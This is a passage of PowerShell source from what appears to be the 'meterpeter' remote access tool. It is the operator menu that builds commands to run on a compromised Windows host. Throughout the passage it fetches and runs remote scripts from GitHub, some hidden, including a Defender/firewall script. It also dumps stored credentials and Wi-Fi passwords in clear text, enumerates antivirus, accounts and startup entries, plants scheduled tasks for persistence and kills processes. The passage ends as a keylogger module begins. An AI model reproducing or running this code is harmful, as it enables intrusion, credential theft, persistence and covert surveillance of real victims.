               $TimeOut = "300"
               $IpRange = "1,255"
               Write-Host "   => Error: wrong iprange, set demo to '$IpRange' .." -ForegroundColor Red
            }
            Else
            {
               $TimeOut = "300" #Faster discovery mode
            }

            #Execute command remotely
            Write-Host " * Scanning Lan for active devices!" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1`" -OutFile `"`$Env:TMP\PingSweep.ps1`"|Out-Null;powershell -File `$Env:TMP\PingSweep.ps1 -Action Enum -IpRange `"$IpRange`" -TimeOut `"$TimeOut`" -Egg True;Remove-Item -Path `$Env:TMP\PingSweep.ps1 -Force"
         }
         If($ping_choise -ieq "PortScan")
         {
            write-host " * Remark: Depending of the number of hosts found,"  -ForegroundColor Yellow;
            write-host "   scan ALL ports migth take up to 40 minuts to end." -ForegroundColor Yellow;
            Write-Host " - Ip address range to scan (1,255)   : " -NoNewline
            $IpRange = Read-Host;
            If($IpRange -eq $null -or $IpRange -NotMatch ',')
            {
               $TimeOut = "400"
               $IpRange = "253,255"
               Write-Host "   => Error: wrong iprange, set demo to '$IpRange' .." -ForegroundColor Red
            }
            Else
            {
               $TimeOut = "400" #Faster discovery mode
            }

            Write-Host " - Scantype (bullet|topports|maxports): " -NoNewline
            $ScanType = Read-Host;
            If($ScanType -iNotMatch '^(bullet|TopPorts|MaxPorts)$')
            {
               $ScanType = "bullet"
               Write-Host "   => Error: wrong scantype, set demo to '$ScanType' .." -ForegroundColor Red
            }

            #Execute command remotely
            Write-Host " * Scanning Lan for active ports\devices!" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1`" -OutFile `"`$Env:TMP\PingSweep.ps1`"|Out-Null;powershell -File `$Env:TMP\PingSweep.ps1 -Action PortScan -IpRange `"$IpRange`" -ScanType $ScanType -TimeOut `"$TimeOut`" -Egg True;Remove-Item -Path `$Env:TMP\PingSweep.ps1 -Force"
         }
         If($ping_choise -ieq "AddrScan")
         {
            write-host " * Remark: Verbose outputs reports 'closed'+'open' ports." -ForegroundColor Yellow;
            Write-Host " - Input ip address to scan ($Local_Host) : " -NoNewline
            $IpRange = Read-Host;
            If($IpRange -NotMatch '^(\d+\d+\d+)\.(\d+\d+\d+).')
            {
               $IpRange = "$Local_Host"
               Write-Host "   => Error: wrong iprange, set demo to '$IpRange' .." -ForegroundColor Red
            }

            Write-Host " - Set scantype (bullet|topports|maxports) : " -NoNewline
            $ScanType = Read-Host;
            If($ScanType -iNotMatch '^(bullet|TopPorts|MaxPorts)$')
            {
               $ScanType = "topports"
               Write-Host "   => Error: wrong scantype, set demo to '$ScanType' .." -ForegroundColor Red
            }

            Write-Host " - Display ping scan verbose outputs? (y|n): " -NoNewline
            $Outputs = Read-Host;
            If($Outputs -iMatch '^(y|yes)$')
            {
               $Outputs = "verbose"
            }
            Else
            {
               $Outputs = "table"            
            }

            #Execute command remotely
            Write-Host " * Scanning '$IpRange' for active ports\services!" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1`" -OutFile `"`$Env:TMP\PingSweep.ps1`"|Out-Null;powershell -File `$Env:TMP\PingSweep.ps1 -Action PortScan -IpRange `"$IpRange`" -ScanType $ScanType -OutPut $Outputs -Egg True;Remove-Item -Path `$Env:TMP\PingSweep.ps1 -Force"
         }
         If($ping_choise -ieq "Return" -or $ping_choise -ieq "cls" -or $ping_choise -ieq "Modules")
         {
            $ping_choise = $null
            $Command = $Null;
         }
      }
      If($choise -ieq "Accounts" -or $choise -ieq "acc")
      {
         write-host " * Listing remote host accounts." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n";
         $Command = "Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Disabled,Name,PasswordRequired,PasswordChangeable,SID|Format-Table -AutoSize|Out-File users.txt;Start-Sleep -Seconds 1;`$Out = Get-Content users.txt|Select -SkipLast 1;If(-not(`$Out)){echo `"   [x] Error: cmdlet cant retrive remote host accounts ..`"}Else{echo `$Out};Remove-Item -Path users.txt -Force"
      }
      If($choise -ieq "RevShell" -or $choise -ieq "Shell")
      {
         write-host " * Listing client shell privileges." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
         $Command = "echo `"   Client ppid : `$pid `" `> Priv.txt;`$I0 = (Get-Process -id `$pid).StartTime.ToString();`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   Client priv : *ADMINISTRATOR*`" `>`> Priv.txt}Else{echo `"   Client priv : USERLAND`" `>`> Priv.txt};echo `"   Client time : `$I0 `" `>`> Priv.txt;`$ClientShell = (Get-location).Path;echo `"   Client path : `$ClientShell`" `>`> Priv.txt;echo `"`n`" `>`> Priv.txt;`$Tree = (tree /A `$ClientShell);echo `$Tree `>`> Priv.txt;Get-Content Priv.txt;Remove-Item Priv.txt -Force"
      }
      If($choise -ieq "ListAppl" -or $choise -ieq "appl")
      {
         write-host " * Listing remote host applications installed." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
         $Command = "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,DisplayVersion | Format-Table -AutoSize";
      }
      If($choise -ieq "Processes" -or $choise -ieq "proc")
      {
         write-host "`n`n   Modules   Description                        Remark" -ForegroundColor green;
         write-host "   -------   -----------                        ------";
         write-host "   Check     List Remote Processe(s) Running    Client:User  - Privileges Required";
         write-host "   Kill      Kill Remote Process From Running   Client:Admin - Privileges Required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Adv:Proc> " -NoNewline -ForeGroundColor Green;
         $wifi_choise = Read-Host;
         If($wifi_choise -ieq "Check")
         {
            write-host " * Listing remote host processe(s) runing." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
            $Command = "Get-Process|Select-Object ProcessName,Description,StartTime|ft|Out-File dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not(`$check_tasks)){echo `"   [i] cmdlet failed to retrieve processes List ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
         }
         If($wifi_choise -ieq "kill")
         {
            Write-Host " - Process Name: " -NoNewline -ForeGroundColor Red;
            $Proc_name = Read-Host;
            If(-not ($proc_name) -or $Proc_name -ieq " ")
            {
               write-host "  => Error: We need To Provide A Process Name .." -ForegroundColor Red -BackGroundColor white;
               write-host "`n`n";Start-Sleep -Seconds 3;
               $Command = $Null;
               $Proc_name = $Null;
            }else{
               ## cmd.exe /c taskkill /F /IM $Proc_name
               write-host " * Kill Remote-Host Process $Proc_name From Runing." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
               $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Powershell Stop-Process -Name `"$Proc_name`" -Force;Start-Sleep -Milliseconds 600;`$RunningProc = (Get-Process -Name $Proc_name -EA SilentlyContinue).Responding;If(`$RunningProc -ieq `"True`"){echo `"   [x] Fail to stop process '$Proc_name' ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}Else{echo `"   [i] Process Name '$Proc_name' successfuly stopped ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}}Else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
            }
         }
         If($wifi_choise -ieq "Return" -or $wifi_choise -ieq "return" -or $wifi_choise -ieq "cls" -or $wifi_choise -ieq "Modules" -or $wifi_choise -ieq "modules")
         {
            $wifi_choise = $null
            $Command = $Null;
         }
      }
      If($choise -ieq "ListTasks" -or $choise -ieq "tasks")
      {
         write-host "`n`n   Warnning" -ForegroundColor Yellow;
         write-host "   --------";
         write-host "   In some targets schtasks service is configurated";
         write-host "   To not run any task IF connected to the battery";
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     -------";
         write-host "   Check     Retrieve Schedule Tasks         Client:User  - Privileges Required";
         write-host "   Query     Advanced Info Single Task       Client:User  - Privileges Required";
         write-host "   Create    Create Remote-Host New Task     Client:User  - Privileges Required";
         write-host "   Delete    Delete Remote-Host Single Task  Client:User  - Privileges Required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Adv:Tasks> " -NoNewline -ForeGroundColor Green;
         $my_choise = Read-Host;
         If($my_choise -ieq "Check" -or $my_choise -ieq "check")
         {
            write-host " * List of Remote-Host Schedule Tasks." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
            $Command = "Get-ScheduledTask|ForEach-Object{Get-ScheduledTaskInfo `$_}|Where-Object{(`$_.NextRunTime -ne `$null)}|Select-object TaskName,LastRunTime,LastTaskResult,NextRunTime|Format-Table -AutoSize|Out-File schedule.txt;`$check_tasks = Get-Content -Path schedule.txt;If(-not (`$check_tasks)){echo `"   [i] None schedule Task found in: $Remote_Host`"|Out-File dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}Else{Get-content schedule.txt;Remove-Item schedule.txt -Force}"
         }
         If($my_choise -ieq "Query" -or $my_choise -ieq "info")
         {
            write-Host " - Input TaskName: " -NoNewline;
            $TaskName = Read-Host;
            If(-not($TaskName)){$TaskName = "BgTaskRegistrationMaintenanceTask"}
            write-host " * Retriving '$TaskName' Task Verbose Information ." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
            $Command = "Get-ScheduledTask `"$TaskName`" | Get-ScheduledTaskInfo | Out-File schedule.txt;Get-ScheduledTask `"$TaskName`" | Select-Object * `>`> schedule.txt;`$check_tasks = Get-Content -Path schedule.txt;If(-not (`$check_tasks)){echo `"   [i] None schedule Task named '$TaskName' found in `$Env:COMPUTERNAME`"|Out-File dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item schedule.txt -Force}Else{Get-content schedule.txt;Remove-Item schedule.txt -Force}"
         }
         If($my_choise -ieq "Create" -or $my_choise -ieq "Create")
         {
            write-Host " - Input TaskName to create: " -NoNewline;
            $TaskName = Read-Host;
            write-Host " - Input Interval (in minuts): " -NoNewline;
            $Interval = Read-Host;
            write-Host " - Task Duration (from 1 TO 9 Hours): " -NoNewline;
            $userinput = Read-Host;
            $Display_dur = "$userinput"+"Hours";$Task_duration = "000"+"$userinput"+":00";
            write-host " Examples: 'cmd /c start calc.exe' [OR] '`$env:tmp\dropper.bat'" -ForegroundColor Blue -BackGroundColor White;
            write-Host " - Input Command|Binary Path: " -NoNewline;
            $execapi = Read-Host;
            If(-not($Interval)){$Interval = "10"}
            If(-not($userinput)){$userinput = "1"}
            If(-not($TaskName)){$TaskName = "METERPETER"}
            If(-not($execapi)){$execapi = "cmd /c start calc.exe"}
            write-host " * This task wil have the max duration of $Display_dur" -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
            $Command = "cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$TaskName`" /tr `"$execapi`" /du $Task_duration;schtasks /Query /tn `"$TaskName`" `> schedule.txt;`$check_tasks = Get-content schedule.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to create Task in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-content schedule.txt;Remove-Item schedule.txt -Force}";
         }
         If($my_choise -ieq "Delete" -or $my_choise -ieq "Delete")
         {
           write-Host " - Input TaskName: " -NoNewline -ForeGroundColor Red;
           $TaskName = Read-Host;
           If(-not($TaskName)){$TaskName = "METERPETER"}
           write-host " * Deleting Remote '$TaskName' Task." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
           $Command = "cmd /R schtasks /Delete /tn `"$TaskName`" /f `> schedule.txt;`$check_tasks = Get-content schedule.txt;If(-not (`$check_tasks)){echo `"   [i] None Task Named '$TaskName' found in `$Env:COMPUTERNAME`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-content schedule.txt;Remove-Item schedule.txt -Force}";  
         }
         If($my_choise -ieq "Return" -or $my_choise -ieq "return" -or $my_choise -ieq "cls" -or $my_choise -ieq "Modules" -or $my_choise -ieq "modules" -or $my_choise -ieq "clear")
         {
           $Command = $Null;
           $my_choise = $Null;
         }
       }
      If($choise -ieq "Drives" -or $choise -ieq "driv")
      {
         write-host " * List of Remote-Host Drives Available." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
         $Command = "Get-PSDrive -PSProvider 'FileSystem'|Select-Object Root,CurrentLocation,Used,Free|ft|Out-File dellog.txt;Start-Sleep -Seconds 1;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
      }
      If($choise -ieq "ListSMB" -or $choise -ieq "smb")
      {
         write-host " * List of Remote-Host SMB Shares." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
         $Command = "Get-SmbShare|Select-Object Name,Path,Description|ft|Out-File smb.txt;Start-Sleep -Seconds 1;`$i = Get-Content smb.txt;If(-not(`$i)){echo `"   [x] Error: none smb accounts found under current system..`" `> smb.txt};Get-Content smb.txt;remove-item smb.txt -Force";
      }
      If($choise -ieq "AntiVirus" -or $choise -ieq "avp")
      {
         write-host " * List Installed AV ProductName." -ForegroundColor Green;Start-Sleep -Seconds 1;Write-Host ""
         $Command = "`$wmiQuery = `"SELECT * FROM AntiVirusProduct`";`$AntivirusProduct = Get-WmiObject -Namespace `"root\SecurityCenter2`" -Query `$wmiQuery|Out-File `$Env:TMP\Dav.meterpeter -Force;Get-Content -Path `$Env:TMP\Dav.meterpeter|Select-Object -Skip 1|Select-Object -SkipLast 3|findstr /V `"__GENUS __SUPERCLASS __RELPATH __DYNASTY __PROPERTY_COUNT __DERIVATION PSComputerName`";Remove-Item -Path `$Env:TMP\Dav.meterpeter -Force";
      }
      If($choise -ieq "Cmdkey" -or $choise -ieq "cred")
      {
         write-host " * List of Remote-Host cmdkey store Credentials." -ForegroundColor Green;
         write-host " [example]: runas /savecred /user:WORKGROUP\Administrator `"\\$Local_Host\SHARE\evil.exe`"" -ForegroundColor Yellow;Start-Sleep -Seconds 2;write-host "`n";
         $Command = "cmd /R cmdkey /list `> dellog.txt;`$check_keys = Get-Content dellog.txt|Select-string `"User:`";If(-not (`$check_keys)){echo `"   [i] None Stored Credentials Found ...`" `> test.txt;Get-Content text.txt;Remove-Item text.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
      }
      If($choise -ieq "Recent" -or $choise -ieq "rece")
      {
         #$path = "$env:userprofile\AppData\Roaming\Microsoft\Windows\Recent"
         write-host " * List of Remote-Host Recent Contents." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
         $Command = "Get-ChildItem `$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Recent|Select-Object Length,Name,LastWriteTime|Format-Table -AutoSize|Out-File startup.txt;Get-content startup.txt;Remove-Item startup.txt -Force"
      }
      If($choise -ieq "StartUp" -or $choise -ieq "start")
      {
         write-host " * List Remote-Host StartUp Contents." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
         $Command = "Get-ChildItem `"`$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup`"|Select-Object Length,Name,LastWriteTime|Format-Table -AutoSize|Out-File startup.txt;`$checkme = Get-Content -Path startup.txt;If(-not(`$checkme ) -or `$checkme -ieq `$null){echo `"   [x] Error: none contents found on startup directory!`" `> startup.txt};Get-Content -Path startup.txt;Remove-Item startup.txt -Force";
      }
      If($choise -ieq "ListRun" -or $choise -ieq "run")
      {
         write-host " * List Remote-Host StartUp Entrys (regedit)." -ForegroundColor Green;Start-Sleep -Seconds 1;
         $Command = "REG QUERY `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`"|Where-Object { `$_ -ne '' }|Out-File runen.meterpeter -Force;echo `"`" `>`> runen.meterpeter;REG QUERY `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`"| Where-Object { `$_ -ne '' } `>`> runen.meterpeter;echo `"`" `>`> runen.meterpeter;REG QUERY `"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`"| Where-Object { `$_ -ne '' } `>`> runen.meterpeter;Get-content -Path runen.meterpeter;Remove-Item -Path runen.meterpeter -Force";
      }
      If($choise -ieq "Browser")
      {
         write-host "`n`n   Description" -ForegroundColor Yellow;
         write-host "   -----------";
         write-host "   This module enumerates remote host default browsers versions";
         write-host "   and leave the cmdlet on target %tmp% directory for manual usage.";
         write-host "   Manual execution: :meterpeter> .\GetBrowsers.ps1 " -ForeGroundColor yellow;
         write-host "`n`n   Modules     Description                 Remark" -ForegroundColor green;
         write-host "   -------     -----------                 ------";
         write-host "   Start       Enumerating remote browsers Client:User - Privileges required";
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Adv:Browser> " -NoNewline -ForeGroundColor Green;
         $Enumerate_choise = Read-Host;
         If($Enumerate_choise -ieq "Start")
         {
           #Uploading Files to remore host $env:tmp trusted location
           write-host " * Uploading GetBrowsers.ps1 to $Remote_Host\\`$Env:TMP" -ForegroundColor Green
           $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/GetBrowsers.ps1`" -OutFile `"`$Env:TMP\GetBrowsers.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\GetBrowsers.ps1 -RECON;Remove-Item -Path `$Env:TMP\BrowserEnum.log -Force;Remove-Item -Path `$Env:TMP\GetBrowsers.ps1 -Force"
        }
         If($Enumerate_choise -ieq "Return" -or $Enumerate_choise -ieq "cls" -or $Enumerate_choise -ieq "Modules" -or $Enumerate_choise -ieq "clear")
         {
          $choise = $Null;
          $Command = $Null;
          $Enumerate_choise = $Null;
        }
      }
      If($choise -ieq "ListDNS" -or $choise -ieq "dns")
      {
        write-host " * List of Remote-Host DNS Entrys." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
        $Command = "Get-DnsClientCache|Select-Object Entry,Name,DataLength,Data|Format-Table -AutoSize > dns.txt;Get-Content dns.txt;remove-item dns.txt -Force";
      }
      If($choise -ieq "TCPinfo" -or $choise -ieq "conn")
      {
         write-host "`n`n   Description" -ForegroundColor Yellow
         write-host "   -----------"
         write-host "   This module enumerate ESTABLISHED TCP\UDP connections!"
         write-host "`n`n   Modules  Description                    Remark" -ForegroundColor green;
         write-host "   -------  -----------                    ------";
         write-host "   Query    Established TCP connections    Client:User  - Privileges Required";
         write-host "   Verbose  Query all TCP\UDP connections  Client:User  - Privileges Required";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Adv:Conn> " -NoNewline -ForeGroundColor Green;
         $ConManager_choise = Read-Host;
         If($ConManager_choise -ieq "Query")
         {
            write-host " * Enumerating established TCP connections." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n";
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetConnections.ps1`" -OutFile `"`$Env:TMP\GetConnections.ps1`"|Out-Null;powershell -W 1 -file `$Env:TMP\GetConnections.ps1 -Action Enum;Start-Sleep -Seconds 1;Remove-Item -Path `$Env:TMP\GetConnections.ps1 -Force"
         }
         If($ConManager_choise -ieq "Verbose")
         {
            write-host " * Enumerating established TCP\UDP connections." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetConnections.ps1`" -OutFile `"`$Env:TMP\GetConnections.ps1`"|Out-Null;powershell -W 1 -file `$Env:TMP\GetConnections.ps1 -Action Verbose;Start-Sleep -Seconds 1;Remove-Item -Path `$Env:TMP\GetConnections.ps1 -Force"
         }
         If($ConManager_choise -ieq "Return" -or $ConManager_choise -ieq "cls" -or $ConManager_choise -ieq "Modules" -or $ConManager_choise -ieq "clear")
         {
          $choise = $Null;
          $Command = $Null;
          $ConManager_choise = $Null;
        }
      }
      If($choise -ieq "Ipv4info" -or $choise -ieq "ipv4")
      {
         write-host " * List of Remote-Host IPv4 Network Statistics." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
         $Command = "cmd /R netstat -s -p ip `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve IPv4 statistics ...`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
      }            
      If($choise -ieq "ListWifi" -or $choise -ieq "wifi")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     -------";
        write-host "   ListProf  Remote-Host wifi Profile        Client:User  - Privileges Required";
        write-host "   ListNetw  List wifi Available networks    Client:User  - Privileges Required";
        write-host "   ListSSID  List Remote-Host SSID Entrys    Client:User  - Privileges Required";
        write-host "   SSIDPass  Extract Stored SSID passwords   Client:User  - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Adv:Wifi> " -NoNewline -ForeGroundColor Green;
        $wifi_choise = Read-Host;
        If($wifi_choise -ieq "ListProf" -or $wifi_choise -ieq "prof")
        {
          write-host " * Remote-Host Profile Statistics." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "cmd /R Netsh WLAN show interface `> pro.txt;`$check_tasks = Get-content pro.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve wifi profile ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item pro.txt -Force}else{Get-Content pro.txt;Remove-Item pro.txt -Force}";          
        }
        If($wifi_choise -ieq "ListNetw" -or $wifi_choise -ieq "netw")
        {
          write-host " * List Available wifi Networks." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "cmd /R Netsh wlan show networks `> pro.txt;`$check_tasks = Get-content pro.txt;If(-not (`$check_tasks)){echo `"   [i] None networks list found in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item pro.txt -Force}else{Get-Content pro.txt;Remove-Item pro.txt -Force}";          
        }
        If($wifi_choise -ieq "ListSSID" -or $wifi_choise -ieq "ssid")
        {
          write-host " * List of Remote-Host SSID profiles." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "cmd /R Netsh WLAN show profiles `> ssid.txt;`$check_tasks = Get-content ssid.txt;If(-not (`$check_tasks)){echo `"   [i] None SSID profile found in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;Remove-Item ssid.txt -Force}else{Get-Content ssid.txt;Remove-Item ssid.txt -Force}";
        }
        If($wifi_choise -ieq "SSIDPass" -or $wifi_choise -ieq "pass")
        {
          write-host " - Sellect WIFI Profile: " -NoNewline;
          $profile = Read-Host;
          If(-not ($profile) -or $profile -eq " ")
          {
            write-host "  => Error: None Profile Name provided .." -ForegroundColor red -BackGroundColor white;
            write-host "  => Usage: meterpeter> AdvInfo -> WifiPass -> ListSSID (to List Profiles)." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
            Start-Sleep -Seconds 4;
            $Command = $Null;
            $profile = $Null;
          }else{
            write-host " * Extracting SSID Password." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
            $Command = "cmd /R netsh wlan show profile $profile Key=Clear `> key.txt;Get-Content key.txt;Remove-Item key.txt -Force"
          }
          $profile = $Null;
        }
        If($wifi_choise -ieq "Return" -or $wifi_choise -ieq "return" -or $wifi_choise -ieq "cls" -or $wifi_choise -ieq "Modules" -or $wifi_choise -ieq "modules" -or $wifi_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
        }
        $choise = $Null;
        $wifi_choise = $Null;
      }
      If($choise -ieq "FRM" -or $choise -ieq "FRManager")
      {
         write-host "`n`n   Remark" -ForegroundColor Yellow;
         write-host "   ------";
         write-host "   Administrator privileges required to create\delete rules.";
         write-host "   This module allow users to block connections to sellected";
         write-host "   localport or from remoteport (default value set are 'Any')";
         write-host "   Warning: Total of 3 max multiple ports accepted. (Create)" -ForegroundColor Yellow;
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     -------";
         write-host "   Query     Query 'active' firewall rules   Client:User  - Privileges Required";
         write-host "   Create    Block application\program rule  Client:Admin - Privileges Required";
         write-host "   Delete    Delete sellected firewall rule  Client:Admin - Privileges Required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Adv:Frm> " -NoNewline -ForeGroundColor Green;
         $Firewall_choise = Read-Host;
         If($Firewall_choise -ieq "Query")
         {
            Write-Host " * List Remote-Host active firewall rules." -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/SilenceDefender_ATP.ps1`" -OutFile `"`$Env:TMP\SilenceDefender_ATP.ps1`"|Unblock-File;powershell -File `$Env:TMP\SilenceDefender_ATP.ps1 -Action Query;Remove-Item -Path `"`$Env:TMP\SilenceDefender_ATP.ps1`" -Force"
         }
         If($Firewall_choise -ieq "Create")
         {
            Write-Host " * Create new 'Block' firewall rule." -ForegroundColor Green
            Write-Host "   => Remark: Dont use double quotes in inputs!" -ForegroundColor Yellow
            
            Write-Host " - The new firewall rule DisplayName: " -NoNewline;
            $DisplayName = Read-Host;
            Write-Host " - The Program to 'block' full path : " -NoNewline;
            $Program = Read-Host;
            Write-Host " - The Program remote port to block : " -NoNewline;
            $RemotePort = Read-Host;
            Write-Host " - The Program local port to block  : " -NoNewline;
            $LocalPort = Read-Host;
            Write-Host " - TCP Direction (Outbound|Inbound) : " -NoNewline;
            $Direction = Read-Host;

            #Make sure we dont have empty inputs
            If(-not($LocalPort) -or $LocalPort -ieq $null){$LocalPort = "Any"}
            If(-not($RemotePort) -or $RemotePort -ieq $null){$RemotePort = "Any"}
            If(-not($Direction) -or $Direction -ieq $null){$Direction = "Inbound"}
            If(-not($DisplayName) -or $DisplayName -ieq $null){$DisplayName = "Block-Firefox"}
            If(-not($Program) -or $Program -ieq $null){$Program = "$Env:ProgramFiles\Mozilla Firefox\firefox.exe"}
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/SilenceDefender_ATP.ps1`" -OutFile `"`$Env:TMP\SilenceDefender_ATP.ps1`"|Unblock-File;powershell -File `$Env:TMP\SilenceDefender_ATP.ps1 -Action Create -DisplayName `"$DisplayName`" -Program `"$Program`" -LocalPort `"$LocalPort`" -RemotePort `"$RemotePort`" -Direction $Direction;Remove-Item -Path `"`$Env:TMP\SilenceDefender_ATP.ps1`" -Force"
         }
         If($Firewall_choise -ieq "Delete")
         {
            Write-Host " * Delete existing Block\Allow firewall rule." -ForegroundColor Green
            Write-Host "   => Remark: Dont use double quotes in inputs!" -ForegroundColor Yellow

            Write-Host " - The DisplayName of the rule to delete: " -NoNewline;
            $DisplayName = Read-Host;

            #Make sure we dont have empty inputs
            If(-not($DisplayName) -or $DisplayName -ieq $null){$DisplayName = "Block-Firefox"}
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/SilenceDefender_ATP.ps1`" -OutFile `"`$Env:TMP\SilenceDefender_ATP.ps1`"|Unblock-File;powershell -File `$Env:TMP\SilenceDefender_ATP.ps1 -Action Delete -DisplayName `"$DisplayName`";Remove-Item -Path `"`$Env:TMP\SilenceDefender_ATP.ps1`" -Force"         
         }
         If($Firewall_choise -ieq "Return" -or $Firewall_choise -ieq "cls" -or $Firewall_choise -ieq "Modules" -or $Firewall_choise -ieq "clear")
         {
           $Command = $Null;
           $Firewall_choise = $Null;
         }
      }
      If($choise -ieq "Return" -or $choise -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "Modules" -or $choise -ieq "modules")
      {
        $Command = $Null;
      }
      $choise = $Null;
      $Clear = $True;
    }


    ## venom v1.0.16 function
    If($Command -ieq "Session")
    {
      ## Check if client (target machine) is still connected ..
      $ParseID = "$Local_Host"+":"+"$Local_Port" -Join ''
      $SessionID = netstat -ano|Select-String "$ParseID"|Select-Object -First 1
      $Command = $SessionID
      Write-Host "`n`n    Proto  Local Address          Foreign Address        State           PID" -ForeGroundColor green;
      Write-Host "    -----  -------------          ---------------        -----           ---";
      ## Display connections statistics
      If(-not($Command) -or $Command -eq " ")
      {
        Write-Host "    None Connections found                              (Client Disconnected)" -ForeGroundColor Red
      } Else {
        Write-Host "  $Command"
      }
      $Command = $Null;
    }


    ## venom v1.0.16 function
    # This module uses redpill keylogger.ps1 cmdlet
    If($Command -ieq "keylogger")
    {
        write-host "`n`n   Description" -ForegroundColor Yellow
        write-host "   -----------"
        write-host "   This module captures screenshots of mouse-clicks Or,"
        write-host "   Captures keyboard keystrokes and store them on %TMP%"
        write-host "   Remark: MouseLogger requires Time-of-capture (secs)" -ForegroundColor Yellow
        write-host "`n`n   Modules   Description                  Remark" -ForegroundColor green;
        write-host "   -------   -----------                  ------";
        write-host "   Mouse     Start remote mouselogger     Start record remote mouseclicks"
        write-host "   Start     Start remote keylogger       Start record remote keystrokes";
